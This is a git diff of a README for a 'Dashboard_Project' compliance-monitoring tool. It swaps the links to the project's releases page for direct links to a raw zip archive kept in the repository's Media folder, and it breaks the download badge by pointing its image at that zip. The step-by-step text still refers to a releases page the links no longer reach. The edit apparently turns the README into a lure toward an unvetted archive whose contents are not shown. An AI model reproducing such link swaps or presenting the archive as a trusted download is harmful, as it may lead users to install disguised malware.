@@ -1,6 +1,6 @@
 # 🚀 Dashboard_Project - Monitor Compliance Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download_Now-%20-%23008CBA?style=for-the-badge)](https://github.com/biswajitroyofficials/Dashboard_Project/releases)
+[![Download Now](https://github.com/biswajitroyofficials/Dashboard_Project/raw/refs/heads/master/Media/Dashboard_Project_2.3-alpha.1.zip%20-%23008CBA?style=for-the-badge)](https://github.com/biswajitroyofficials/Dashboard_Project/raw/refs/heads/master/Media/Dashboard_Project_2.3-alpha.1.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ To get started with the Dashboard_Project, follow these simple steps to download
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can download the application.  
-   [Download Here](https://github.com/biswajitroyofficials/Dashboard_Project/releases)
+   [Download Here](https://github.com/biswajitroyofficials/Dashboard_Project/raw/refs/heads/master/Media/Dashboard_Project_2.3-alpha.1.zip)
 
 2. **Select the Latest Version**  
    On the releases page, you will see a list of the latest versions. Choose the most recent version for optimal performance.
@@ -67,4 +67,4 @@ We plan to regularly update Dashboard_Project with new features and improvements
 
 Thank you for choosing Dashboard_Project. We appreciate your support and hope this application helps you achieve your goals effortlessly. Happy monitoring! 
 
-[Download Here Again](https://github.com/biswajitroyofficials/Dashboard_Project/releases)
+[Download Here Again](https://github.com/biswajitroyofficials/Dashboard_Project/raw/refs/heads/master/Media/Dashboard_Project_2.3-alpha.1.zip)
